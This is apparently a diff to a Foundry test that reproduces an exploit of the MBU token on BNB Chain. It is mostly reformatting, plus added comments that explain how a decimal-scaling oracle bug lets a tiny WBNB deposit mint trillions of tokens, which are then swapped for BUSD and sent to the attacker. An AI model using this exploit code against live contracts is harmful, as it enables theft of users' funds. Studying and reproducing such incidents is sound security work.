@@ -36,7 +36,11 @@ contract MBUToken_exp is Test {
 
         attC.attack{value: 1 ether}();
 
-        emit log_named_decimal_uint("Profit in BUSD", IERC20(BUSD).balanceOf(attacker), 18);
+        emit log_named_decimal_uint(
+            "Profit in BUSD",
+            IERC20(BUSD).balanceOf(attacker),
+            18
+        );
     }
 }
 
@@ -48,20 +52,30 @@ contract AttackerC {
 
         I_0x95e9_ERC1967Proxy(_0x95e9_ERC1967Proxy).deposit(wbnb, 0.001 ether);
 
+        // Oracle price	656 * 1e18	656 * 1e18
+        // Deposit value	0.001 WBNB = 1e15	1e15
+        // Tokens minted	(1e15 * 656e18) / 1e18 = 656e15	1e15 * 656e18 * 1e18 = 656e51
+        // Final result	~0.656 tokens	~9.7 trillion tokens
+        console.log("MBU balance", IERC20(MBU).balanceOf(address(this)));
+        //9731099570720980659843835099042677 MBU
         IERC20(MBU).approve(router, type(uint256).max);
 
         address[] memory path = new address[](2);
         path[0] = MBU;
         path[1] = BUSD;
-        IPancakeRouter(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            30_000_000 ether,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        IPancakeRouter(payable(router))
+            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                30_000_000 ether,
+                0,
+                path,
+                address(this),
+                block.timestamp
+            );
 
-        IERC20(BUSD).transfer(msg.sender, IERC20(BUSD).balanceOf(address(this)));
+        IERC20(BUSD).transfer(
+            msg.sender,
+            IERC20(BUSD).balanceOf(address(this))
+        );
 
         // Pay MEV Protected Transaction
         BlockRazor.call{value: 0.999 ether}("");
@@ -69,5 +83,5 @@ contract AttackerC {
 }
 
 interface I_0x95e9_ERC1967Proxy {
-    function deposit(address, uint256) external returns(uint256);
+    function deposit(address, uint256) external returns (uint256);
 }
